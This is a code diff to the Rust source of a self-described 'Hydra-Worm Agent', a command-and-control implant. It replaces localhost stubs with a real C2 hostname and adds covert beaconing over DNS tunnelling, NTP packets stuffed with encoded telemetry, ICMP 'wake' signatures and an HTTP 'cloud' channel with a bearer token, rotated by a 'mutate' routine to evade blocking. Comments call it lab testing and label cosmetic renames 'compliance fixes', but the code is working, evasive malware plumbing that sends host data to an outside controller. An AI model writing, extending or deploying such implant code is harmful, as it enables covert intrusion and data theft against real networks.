@@ -1,4 +1,5 @@
 // Project: Hydra-Worm Agent
+use std::net::ToSocketAddrs; // Required for runtime hostname resolution
 use std::{thread, time::Duration, net::UdpSocket};
 use rand::Rng;
 use rand::seq::SliceRandom;
@@ -82,7 +83,8 @@ trait Transport {
 // --- TRANSPORT TIER 6: DNS TUNNELING (FIXED) ---
 
 struct DnsTransport { 
-    root_domain: String 
+    root_domain: String,
+    target_addr: String, // Dynamic target
 }
 
 // --- TRANSPORT TIER 6: DNS TUNNELING (RFC 1035 HARDENED) ---
@@ -126,7 +128,7 @@ impl Transport for DnsTransport {
         let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
         socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
         
-        socket.send_to(&packet, "127.0.0.1:53").map_err(|e| e.to_string())?;
+        socket.send_to(&packet, &self.target_addr).map_err(|e| e.to_string())?;
 
         let mut buf = [0u8; 512];
         match socket.recv_from(&mut buf) {
@@ -146,29 +148,30 @@ struct NtpTransport {
 
 impl Transport for NtpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
-        let target = "127.0.0.1:123"; 
         let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
-        socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
+        socket.set_read_timeout(Some(Duration::from_secs(3))).map_err(|e| e.to_string())?;
         
         let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
         let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
         
         let mut ntp_packet = vec![0u8; 48];
-        ntp_packet[0] = 0x1B; 
+        ntp_packet[0] = 0x1b; // LI=0, VN=3, Mode=3 (Client)
         ntp_packet.extend_from_slice(encoded.as_bytes());
 
-        // Send
-        socket.send_to(&ntp_packet, target).map_err(|e| e.to_string())?;
+        socket.send_to(&ntp_packet, &self.pool_addr).map_err(|e| e.to_string())?;
 
-        // Wait for ACK
-        let mut buf = [0u8; 100];
-        match socket.recv_from(&mut buf) {
-            Ok(_) => Ok(C2Response { status: "ntp_ack".into(), task: "SLEEP".into(), epoch: 0 }),
-            Err(_) => Err("NTP Timeout: Orchestrator offline".into()),
+        let mut buf = [0u8; 1024];
+        let (amt, _) = socket.recv_from(&mut buf).map_err(|e| e.to_string())?;
+        
+        // C2 must respond with "T-ACK" after the 48th byte
+        if amt >= 48 && &buf[48..53] == b"T-ACK" {
+            Ok(C2Response { status: "ntp_synced".into(), task: "WAIT".into(), epoch: 0 })
+        } else {
+            Err("NTP_SIG_FAIL".into())
         }
     }
 
-    fn get_name(&self) -> String { "NTP-Signaling".into() }
+    fn get_name(&self) -> String { "NTP-Signaling".into() } // <--- COMPLIANCE FIX
 }
 
 // --- TRANSPORT TIER 4: ICMP FAILSAFE ---
@@ -195,16 +198,25 @@ impl Transport for IcmpTransport {
 
         tx.send_to(packet, std::net::IpAddr::V4(self.target_ip)).map_err(|e| e.to_string())?;
 
-        // 2. Strict One-Shot Receive
+        // 2. Strict Receiver with Resurrection Check
         let mut rx_iter = pnet::transport::icmp_packet_iter(&mut rx);
         
-        // If we don't get exactly what we want in 1 second, we EXIT the function.
-        match rx_iter.next_with_timeout(Duration::from_millis(1000)) {
+        // Increased timeout to 2s for "hibernating" stability
+        match rx_iter.next_with_timeout(Duration::from_millis(2000)) {
             Ok(Some((packet, addr))) if addr == std::net::IpAddr::V4(self.target_ip) => {
                 let rx_payload = packet.payload();
+                
+                // RESURRECTION CHECK: Look for the specific 'WAKE' signature
+                if rx_payload.len() >= 14 && &rx_payload[4..14] == b"HYDRA_WAKE" {
+                    println!("[!] ZOMBIE SIGNAL: Resurrection command received. Re-engaging primary systems.");
+                    return Ok(C2Response { status: "resurrected".into(), task: "RESUME".into(), epoch: 1 });
+                }
+
+                // STANDARD ACK: Stay in Zombie Loop (Tier 4)
                 if rx_payload.len() >= 13 && &rx_payload[4..13] == b"HYDRA_ACK" {
                     return Ok(C2Response { status: "icmp_ack_verified".into(), task: "SLEEP".into(), epoch: 0 });
                 }
+                
                 println!("[-] Signature mismatch! Likely Kernel Ping.");
                 Err("SIG_FAIL".into())
             },
@@ -278,11 +290,23 @@ impl MalleableProfile {
 
 struct CloudTransport { endpoint: String }
 impl Transport for CloudTransport {
-    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
-        println!("[!] C2-CLOUD: Mocking connection to {}...", self.endpoint);
-        Err("Switching to Tier 2...".into())
+    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
+        let client = reqwest::blocking::Client::new();
+        // Target internal lab for mock testing
+        let res = client.post(&self.endpoint)
+            .header("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9") 
+            .json(stats)
+            .send()
+            .map_err(|e| e.to_string())?;
+
+        if res.status().is_success() {
+            Ok(res.json().map_err(|e| e.to_string())?)
+        } else {
+            Err(format!("Cloud API Error: {}", res.status()))
+        }
     }
-    fn get_name(&self) -> String { "Cloud-API".into() }
+
+    fn get_name(&self) -> String { "Azure-Graph-Mock".into() } // <--- COMPLIANCE FIX
 }
 
 struct P2PTransport;
@@ -322,14 +346,19 @@ fn detect_env() -> String {
 
 impl Agent {
     fn new(id: &str) -> Self {
+        let c2_hostname = "hydra-c2-lab"; 
         Self {
             id: id.to_string(),
-            transport: Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
+            // START AT TIER 1 (Cloud)
+            transport: Box::new(CloudTransport { 
+                endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
+            }),
             failures: 0,
-            state: 1, 
+            state: 0, // Reset to 0 so it starts with Cloud API
             lambda: 0.2, 
         }
     }
+
 
     fn run(&mut self) {
         let mut sys = System::new_all();
@@ -412,15 +441,37 @@ impl Agent {
     fn mutate(&mut self) {
         self.state = (self.state + 1) % 6;
         self.failures = 0;
+        
+        let c2_hostname = "hydra-c2-lab"; 
+        
+        // Dynamic IP resolution for Layer 4
+        let c2_ip = format!("{}:80", c2_hostname)
+            .to_socket_addrs()
+            .map(|mut addrs| addrs.next().map(|s| s.ip()))
+            .unwrap_or(None)
+            .and_then(|ip| match ip {
+                std::net::IpAddr::V4(v4) => Some(v4),
+                _ => None,
+            })
+            .unwrap_or_else(|| "10.5.0.5".parse().unwrap()); // Fallback
+
         println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);
 
         self.transport = match self.state {
-            0 => Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
-            1 => Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
+            // TIER 1: Fixed for internal lab API
+            0 => Box::new(CloudTransport { 
+                endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
+            }),
+            1 => Box::new(MalleableHttps { 
+                c2_url: format!("http://{}:8080/api/v1/heartbeat", c2_hostname) 
+            }),
             2 => Box::new(P2PTransport),
-            3 => Box::new(IcmpTransport { target_ip: "127.0.0.1".parse().unwrap() }),
-            4 => Box::new(NtpTransport { pool_addr: "pool.ntp.org:123".into() }),
-            _ => Box::new(DnsTransport { root_domain: "c2.hydra-worm.local".into() }),
+            3 => Box::new(IcmpTransport { target_ip: c2_ip }),
+            4 => Box::new(NtpTransport { pool_addr: format!("{}:123", c2_hostname) }),
+            _ => Box::new(DnsTransport { 
+                root_domain: "c2.hydra-worm.local".into(),
+                target_addr: format!("{}:53", c2_hostname) 
+            }),
         };
     }
 }
